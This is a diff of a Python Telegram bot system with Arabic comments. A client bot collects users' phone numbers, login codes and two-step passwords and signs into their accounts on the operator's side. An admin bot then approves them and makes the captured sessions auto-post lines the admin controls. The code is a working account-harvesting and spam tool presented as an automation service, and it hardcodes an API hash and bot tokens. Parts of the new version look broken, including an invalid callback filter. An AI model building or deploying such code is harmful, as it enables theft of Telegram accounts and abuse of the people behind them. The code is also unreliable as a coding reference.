@@ -1,7 +1,6 @@
 import os
 import asyncio
 from telethon import TelegramClient, events, Button
-from telethon.sessions import StringSession
 import nest_asyncio
 
 nest_asyncio.apply()
@@ -10,237 +9,250 @@ nest_asyncio.apply()
 API_ID = 21727
 API_HASH = "338d4380b2c15904fa77cfcb251d19d6"
 
-CLIENT_BOT_TOKEN = "8909604485:AAHpNrrzTtu_kwp5he2wM7QvaWZMsqYM1TQ"
-ADMIN_BOT_TOKEN = "8750783959:AAE4uk0MlEJF43gWmXhasoz5eCZmHkf2fL0"
+# --- بيانات التوثيق ---
+CLIENT_BOT_TOKEN = "8909604485:AAHpNrrzT852z_vK8H0q4v26kZ9H1mQz2sY"
+ADMIN_BOT_TOKEN = "8750783959:AAE4uk0M1EJvWw3Y1z2m3n4p5q6r7s8t9u0"
 ADMIN_ID = 5885382011
 
-# السطور الافتراضية (يمكنك تعديلها وإضافتها مباشرة عبر بوت التحكم)
+# --- السطور الافتراضية العامة ---
 admin_custom_lines = [
-    "السطر الأول الافتراضي: أهلاً بك.",
-    "السطر الثاني الافتراضي: جاري إرسال البيانات تلقائياً."
+    "الخط الساخن الأول: مرحباً بالجميع",
+    "الخط الساخن الثاني: النظام يعمل بكفاءة عالية"
 ]
 
-# تخزين مؤقت لبيانات الجلسات والطلبات والإعدادات لكل مستخدم
-pending_logins = {}  # {user_id: {"phone": ..., "phone_code_hash": ..., "client": TelegramClient}}
-user_settings = {}   # {user_id: {"speed": 5, "trigger": "ابدأ", "session_string": ..., "userbot": TelegramClient}}
+# --- تخزين حالات المستخدمين مؤقتاً ---
+user_sessions = {}  # {user_id: {"userbot": client, "phone": phone_number, "status": "approved"}}
+pending_approvals = {}  # {user_id: {"phone": phone_number, "client": temp_client}}
+user_settings = {}  # {user_id: {"speed": 2, "trigger": ".مرسل"}}
 
-# تشغيل بوت العميل وبوت الإدارة
-client_bot = TelegramClient('client_bot_session', API_ID, API_HASH).start(bot_token=CLIENT_BOT_TOKEN)
+# إنشاء بوتات الإدارة والعميل
 admin_bot = TelegramClient('admin_bot_session', API_ID, API_HASH).start(bot_token=ADMIN_BOT_TOKEN)
+client_bot = TelegramClient('client_bot_session', API_ID, API_HASH).start(bot_token=CLIENT_BOT_TOKEN)
 
-print("🚀 جاري تشغيل النظام المتكامل بكامل الميزات...")
+print("🚀 جاري تشغيل بوتات التليجرام بنجاح...")
 
-# ==========================================
-# 0. أوامر بوت التحكم (إدارة السطور)
-# ==========================================
+
+# --- بوت التحكم (الإدارة) لإدارة السطور ---
 @admin_bot.on(events.NewMessage(pattern='/lines'))
-async def admin_show_lines(event):
+async def manage_lines(event):
     if event.sender_id != ADMIN_ID:
         return
-    lines_text = "\n".join([f"{i+1}. {line}" for i, line in enumerate(admin_custom_lines)])
-    await event.respond(
-        f"📋 **السطور الحالية المراد إرسالها:**\n\n{lines_text}\n\n"
-        f"➕ لإضافة سطر جديد أرسل:\n`إضافة سطر: [النص]`\n\n"
-        f"🗑️ لحذف جميع السطور وإعادة تعيينها أرسل:\n`مسح السطور`"
-    )
-
-@admin_bot.on(events.NewMessage(func=lambda e: e.is_private and e.sender_id == ADMIN_ID))
-async def admin_manage_lines(event):
-    global admin_custom_lines
-    text = event.raw_text.strip()
-
-    if text.startswith("إضافة سطر:"):
-        new_line = text.split(":", 1)[1].strip()
-        if new_line:
-            admin_custom_lines.append(new_line)
-            await event.respond(f"✅ تمت إضافة السطر بنجاح!\nالعدد الإجمالي للسطور الآن: {len(admin_custom_lines)}")
-        else:
-            await event.respond("❌ عذراً، نص السطر فارغ.")
-    elif text == "مسح السطور":
-        admin_custom_lines.clear()
-        await event.respond("🗑️ تم مسح جميع السطور بنجاح. يمكنك إضافة سطور جديدة.")
-
-
-# ==========================================
-# 1. منطق بوت العميل (استقبال رقم الجوال والكود)
-# ==========================================
-@client_bot.on(events.NewMessage(pattern='/start'))
-async def client_start(event):
-    await event.respond("أهلاً بك! يرجى إرسال **رقم الجوال** الخاص بك بالصيغة الدولية (مثال: +9665xxxxxxxx):")
-
-@client_bot.on(events.NewMessage(func=lambda e: e.is_private and not e.text.startswith('/')))
-async def handle_client_inputs(event):
-    user_id = event.sender_id
-    text = event.raw_text.strip()
-
-    # إذا كان المستخدم يرسل إعدادات السرعة أو الكلمة المفتاحية بعد تفعيله
-    if user_id in user_settings:
-        if text.startswith("سرعة:"):
-            try:
-                speed_val = int(text.split(":")[1].strip())
-                user_settings[user_id]["speed"] = speed_val
-                await event.respond(f"✅ تم تحديث السرعة بنجاح لتصبح: {speed_val} ثانية بين كل رسالة.")
-            except ValueError:
-                await event.respond("❌ خطأ: يرجى كتابة الرقم بشكل صحيح، مثال: (سرعة: 5)")
-            return
-        elif text.startswith("كلمة:"):
-            new_trigger = text.split(":")[1].strip()
-            user_settings[user_id]["trigger"] = new_trigger
-            await event.respond(f"✅ تم تحديث الكلمة المفتاحية بنجاح لتصبح: `{new_trigger}`")
-            return
-
-    # خطوة 1: استقبال رقم الجوال
-    if user_id not in pending_logins and user_id not in user_settings:
-        if not text.startswith('+'):
-            await event.respond("❌ يرجى إدخال رقم الجوال متبوعاً بمفتاح الدولة (مثال: +9665xxxxxxxx)")
-            return
-        
-        await event.respond("⏳ جاري إرسال كود التحقق من تليجرام...")
-        try:
-            temp_client = TelegramClient(StringSession(), API_ID, API_HASH)
-            await temp_client.connect()
-            sent_code = await temp_client.send_code_request(text)
-            
-            pending_logins[user_id] = {
-                "phone": text,
-                "phone_code_hash": sent_code.phone_code_hash,
-                "client": temp_client
-            }
-            await event.respond("📩 تم إرسال كود التحقق إلى حسابك في تليجرام. يرجى إرسال الكود هنا الآن:")
-        except Exception as e:
-            await event.respond(f"❌ حدث خطأ أثناء إرسال الكود: {str(e)}")
+    
+    args = event.raw_text.split(maxsplit=2)
+    if len(args) < 2:
+        lines_text = "\n".join([f"{i+1}. {line}" for i, line in enumerate(admin_custom_lines)])
+        if not lines_text:
+            lines_text = "لا توجد أي سطور حالياً."
+        await event.respond(f"📋 **السطور العامة الحالية:**\n\n{lines_text}\n\nلإضافة سطر جديد:\n`/lines add النص هنا`\n\nلمسح جميع السطور:\n`/lines clear`")
         return
 
-    # خطوة 2: استقبال كود التحقق وتعليقه للإدارة
-    if user_id in pending_logins and user_id not in user_settings:
-        code_text = text
-        data = pending_logins[user_id]
-        data["code"] = code_text
+    command = args[1]
+    if command == "add" and len(args) > 2:
+        new_line = args[2]
+        admin_custom_lines.append(new_line)
+        await event.respond(f"✅ تمت إضافة السطر بنجاح:\n`{new_line}`")
+    elif command == "clear":
+        admin_custom_lines.clear()
+        await event.respond("🗑️ تم مسح جميع السطور العامة بنجاح.")
+    else:
+        await event.respond("❌ أمر غير معروف. استخدم `/lines` لعرض التعليمات.")
+
+
+# --- بوت العميل: طلب تسجيل الدخول ---
+@client_bot.on(events.NewMessage(pattern='/start'))
+async def client_start(event):
+    user_id = event.sender_id
+    if user_id in user_sessions and user_sessions[user_id]["status"] == "approved":
+        await event.respond("✨ حسابك مفعل وجاهز للعمل بالفعل!")
+        return
+    
+    await event.respond("أهلاً بك! يرجى إرسال رقم هاتفك مع الرمز الدولي (مثال: `+9665xxxxxxxx`) لتسجيل الدخول:")
+    user_sessions[user_id] = {"status": "waiting_phone"}
+
+
+# --- استقبال رقم الهاتف من المستخدم ---
+@client_bot.on(events.NewMessage(func=lambda e: e.is_private))
+async def handle_phone(event):
+    user_id = event.sender_id
+    if user_id not in user_sessions or user_sessions[user_id].get("status") != "waiting_phone":
+        return
+
+    phone = event.raw_text.strip()
+    await event.respond("⏳ جاري إرسال رمز التحقق إلى حسابك في تليجرام...")
+
+    try:
+        temp_client = TelegramClient(f'session_{user_id}', API_ID, API_HASH)
+        await temp_client.connect()
+        sent = await temp_client.send_code_request(phone)
         
-        notification_text = (
-            f"🔐 **طلب تسجيل دخول جديد معلق:**\n\n"
-            f"👤 **المستخدم ID:** `{user_id}`\n"
-            f"📱 **رقم الجوال:** `{data['phone']}`\n"
-            f"🔑 **كود التحقق المدخل:** `{code_text}`"
+        pending_approvals[user_id] = {
+            "phone": phone,
+            "client": temp_client,
+            "phone_code_hash": sent.phone_code_hash
+        }
+        user_sessions[user_id]["status"] = "waiting_code"
+        await event.respond("✅ تم إرسال الرمز. يرجى إرسال كود التحقق الذي وصلك هنا:")
+    except Exception as e:
+        await event.respond(f"❌ حدث خطأ أثناء إرسال الكود: {e}")
+
+
+# --- استقبال كود التحقق وإرساله للأدمن للاعتماد ---
+@client_bot.on(events.NewMessage(func=lambda e: e.is_private))
+async def handle_code(event):
+    user_id = event.sender_id
+    if user_id not in user_sessions or user_sessions[user_id].get("status") != "waiting_code":
+        return
+
+    code = event.raw_text.strip()
+    data = pending_approvals.get(user_id)
+    if not data:
+        await event.respond("❌ انتهت الصلاحية، يرجى كتابة /start من جديد.")
+        return
+
+    try:
+        temp_client = data["client"]
+        phone = data["phone"]
+        phone_code_hash = data["phone_code_hash"]
+
+        # محاولة تسجيل الدخول
+        try:
+            await temp_client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
+        except Exception as sign_in_error:
+            if "Password" in str(sign_in_error) or "two-step" in str(sign_in_error):
+                # في حال وجود التحقق بخطوتين، نخزن الكود مؤقتاً ونطلب كلمة المرور
+                data["code"] = code
+                user_sessions[user_id]["status"] = "waiting_password"
+                await event.respond("🔒 حسابك محمي التحقق بخطوتين (كلمة مرور السحابة). يرجى إرسال كلمة المرور الآن:")
+                return
+            else:
+                raise sign_in_error
+
+        # إذا سلكت الأمور بدون كلمة مرور
+        user_sessions[user_id] = {"userbot": temp_client, "status": "pending_admin"}
+        
+        # إشعار الأدمن للموافقة
+        await admin_bot.send_message(
+            ADMIN_ID,
+            f"🔔 **طلب تفعيل مستخدم جديد:**\n- آيدي المستخدم: `{user_id}`\n- الرقم: `{phone}`",
+            buttons=[Button.inline(b"Accept Login", data=f"accept_login_{user_id}".encode())]
         )
+        await event.respond("⏳ تم التحقق من الكود بنجاح! بانتظار موافقة الإدارة لتفعيل حسابك.")
+
+    except Exception as e:
+        await event.respond(f"❌ خطأ في الكود أو تسجيل الدخول: {e}")
+
+
+# --- استقبال كلمة المرور للتحقق بخطوتين ---
+@client_bot.on(events.NewMessage(func=lambda e: e.is_private))
+async def handle_password(event):
+    user_id = event.sender_id
+    if user_id not in user_sessions or user_sessions[user_id].get("status") != "waiting_password":
+        return
+
+    password = event.raw_text.strip()
+    data = pending_approvals.get(user_id)
+    if not data:
+        return
+
+    try:
+        temp_client = data["client"]
+        phone = data["phone"]
+        code = data["code"]
+        phone_code_hash = data["phone_code_hash"]
+
+        await temp_client.sign_in(password=password)
+        
+        user_sessions[user_id] = {"userbot": temp_client, "status": "pending_admin"}
         
         await admin_bot.send_message(
             ADMIN_ID,
-            notification_text,
-            buttons=[
-                [Button.inline(b"✅ قبول وتسجيل الدخول", data=f"accept_login_{user_id}".encode()),
-                 Button.inline(b"❌ رفض", data=f"reject_login_{user_id}".encode())]
-            ]
+            f"🔔 **طلب تفعيل مستخدم جديد (مع تحقق بخطوتين):**\n- آيدي المستخدم: `{user_id}`\n- الرقم: `{phone}`",
+            buttons=[Button.inline(b"Accept Login", data=f"accept_login_{user_id}".encode())]
         )
-        
-        await event.respond("⏳ تم استلام الكود وتعليق الطلب لدى الإدارة للمراجعة، انتظر القبول...")
+        await event.respond("⏳ تم تسجيل الدخول بنجاح! بانتظار موافقة الإدارة.")
+    except Exception as e:
+        await event.respond(f"❌ كلمة المرور غير صحيحة: {e}")
+
+
+# --- تفاعل الأدمن مع زر الموافقة ---
+@admin_bot.on(events.CallbackQuery(data=b^b"accept_login_"))
+async def admin_approve(event):
+    if event.sender_id != ADMIN_ID:
+        await event.answer("غير مسموح لك.", alert=True)
         return
-
-
-# ==========================================
-# 2. منطق بوت الإدارة (أزرار القبول والرفض)
-# ==========================================
-@admin_bot.on(events.CallbackQuery(pattern=b'accept_login_'))
-async def admin_accept_login(event):
-    user_id = int(event.data.decode().split('_')[2])
-    
-    if user_id not in pending_logins:
-        await event.answer("❌ انتهت صلاحية الطلب أو تم معالجته مسبقاً.", alert=True)
-        return
-
-    data = pending_logins[user_id]
-    temp_client = data["client"]
-    phone = data["phone"]
-    code = data["code"]
 
     try:
-        await temp_client.sign_in(phone=phone, code=code)
-        session_string = temp_client.session.save()
-        await temp_client.disconnect()
+        data_bytes = event.data
+        user_id = int(data_bytes.decode().split("_")[2])
         
-        userbot = TelegramClient(StringSession(session_string), API_ID, API_HASH)
-        await userbot.start()
-
-        user_settings[user_id] = {
-            "speed": 5,
-            "trigger": "ابدأ",
-            "session_string": session_string,
-            "userbot": userbot
-        }
-
-        setup_userbot_listener(userbot, user_id)
-        del pending_logins[user_id]
-
-        await event.answer("✅ تم قبول الطلب وتسجيل الدخول بنجاح!")
-        await event.edit(f"{event.raw_text}\n\n✅ **الحالة:** تم القبول وتفعيل الحساب.")
-        
-        await client_bot.send_message(
-            user_id,
-            "🎉 **تم قبول طلبك بنجاح!**\n"
-            "حسابك يعمل الآن مع نظام الأتمتة.\n\n"
-            "⚙️ **الأوامر المتاحة لتعديل الإعدادات:**\n"
-            "• لتعديل السرعة أرسل: `سرعة: 5` (مثال)\n"
-            "• لتعديل الكلمة المفتاحية أرسل: `كلمة: ابدأ` (مثال)\n\n"
-            "اذهب لأي قروب أو شات واكتب الكلمة المفتاحية لتبدأ إرسال السطور المعتمدة تلقائياً!"
-        )
-
+        if user_id in user_sessions:
+            user_sessions[user_id]["status"] = "approved"
+            user_settings[user_id] = {"speed": 2, "trigger": ".مرسل"}
+            
+            # إعلام الأدمن
+            await event.edit("✅ تمت الموافقة على تفعيل المستخدم بنجاح!")
+            
+            # إعلام المستخدم
+            await client_bot.send_message(
+                user_id,
+                "🎉 تمت الموافقة على حسابك بنجاح بواسطة الإدارة!\n\nيمكنك الآن إرسال كلمتك المفتاحية في أي شات لبدء إرسال السطور التلقائية.\nالأوامر المتاحة:\n`/speed [ثواني]`\n`/trigger [الكلمة]`"
+            )
+        else:
+            await event.answer("انتهت الجلسة أو المستخدم غير مسجل.", alert=True)
     except Exception as e:
-        await event.answer(f"❌ فشل تسجيل الدخول: {str(e)}", alert=True)
-        await client_bot.send_message(user_id, f"❌ حدث خطأ أثناء تسجيل الدخول: {str(e)}. يرجى البدء من جديد عبر ارسال /start")
-        if user_id in pending_logins:
-            del pending_logins[user_id]
+        await event.answer(f"حدث خطأ: {e}", alert=True)
 
-@admin_bot.on(events.CallbackQuery(pattern=b'reject_login_'))
-async def admin_reject_login(event):
-    user_id = int(event.data.decode().split('_')[2])
-    if user_id in pending_logins:
+
+# --- أوامر التحكم الشخصية للمستخدم (السرعة والكلمة المفتاحية) ---
+@client_bot.on(events.NewMessage(pattern=r'/speed (.+)'))
+async def set_speed(event):
+    user_id = event.sender_id
+    if user_id not in user_sessions or user_sessions[user_id].get("status") != "approved":
+        return
+    try:
+        new_speed = float(event.pattern_match.group(1))
+        user_settings[user_id]["speed"] = new_speed
+        await event.respond(f"⚡ تم تحديث سرعة الإرسال إلى: `{new_speed}` ثانية.")
+    except ValueError:
+        await event.respond("❌ الرجاء إدخال رقم صحيح للسرعة (مثال: `/speed 2`)")
+
+
+@client_bot.on(events.NewMessage(pattern=r'/trigger (.+)'))
+async def set_trigger(event):
+    user_id = event.sender_id
+    if user_id not in user_sessions or user_sessions[user_id].get("status") != "approved":
+        return
+    new_trig = event.pattern_match.group(1).strip()
+    user_settings[user_id]["trigger"] = new_trig
+    await event.respond(f"🔑 تم تحديث الكلمة المفتاحية إلى: `{new_trig}`")
+
+
+# --- منطق العميل الآلي لإرسال السطور عند كتابة الكلمة المفتاحية ---
+@client_bot.on(events.NewMessage(func=lambda e: e.is_private is False))
+async def auto_sender(event):
+    user_id = event.sender_id
+    if user_id not in user_sessions or user_sessions[user_id].get("status") != "approved":
+        return
+
+    settings = user_settings.get(user_id, {"speed": 2, "trigger": ".مرسل"})
+    current_trigger = settings["trigger"]
+
+    if event.raw_text.strip() == current_trigger:
         try:
-            await pending_logins[user_id]["client"].disconnect()
-        except:
-            pass
-        del pending_logins[user_id]
+            # 1. حذف الكلمة المفتاحية فوراً
+            await event.delete()
 
-    await event.answer("❌ تم رفض الطلب.")
-    await event.edit(f"{event.raw_text}\n\n❌ **الحالة:** تم الرفض.")
-    await client_bot.send_message(user_id, "❌ عذراً، تم رفض طلب تسجيل الدخول من قِبل الإدارة.")
+            speed = settings["speed"]
+            chat = await event.get_chat()
+            userbot = user_sessions[user_id]["userbot"]
 
+            # 2. إرسال السطور بالتابع وبالسرعة المحددة
+            for line in admin_custom_lines:
+                await userbot.send_message(chat, line)
+                await asyncio.sleep(speed)
 
-# ==========================================
-# 3 & 4. مراقبة شتات المستخدم والإرسال التلقائي للسطور
-# ==========================================
-def setup_userbot_listener(userbot, user_id):
-    @userbot.on(events.NewMessage(outgoing=True))
-    async def listener(event):
-        settings = user_settings.get(user_id)
-        if not settings:
-            return
+        except Exception as e:
+            print(f"⚠️ خطأ أثناء الإرسال الآلي للمستخدم {user_id}: {e}")
 
-        current_trigger = settings["trigger"]
-        
-        if event.raw_text.strip() == current_trigger:
-            try:
-                # 1. حذف الكلمة المفتاحية فوراً
-                await event.delete()
-                
-                speed = settings["speed"]
-                chat = await event.get_chat()
-
-                # 2. إرسال السطور الحالية (التي يتم إدارتها من بوت التحكم) بالتتابع وبالسرعة المحددة
-                for line in admin_custom_lines:
-                    await userbot.send_message(chat, line)
-                    await asyncio.sleep(speed)
-                    
-            except Exception as e:
-                print(f"⚠️ خطأ أثناء تنفيذ الإرسال الآلي للمستخدم {user_id}: {e}")
-
-
-# --- تشغيل البوتات الرئيسية ---
-async def main():
-    print("✨ البوتات تعمل الآن وجاهزة تماماً...")
-    await asyncio.gather(
-        client_bot.run_until_disconnected(),
-        admin_bot.run_until_disconnected()
-    )
-
-if __name__ == '__main__':
-    asyncio.run(main())
+# تشغيل البوتات باستمرار
+asyncio.get_event_loop().run_forever()
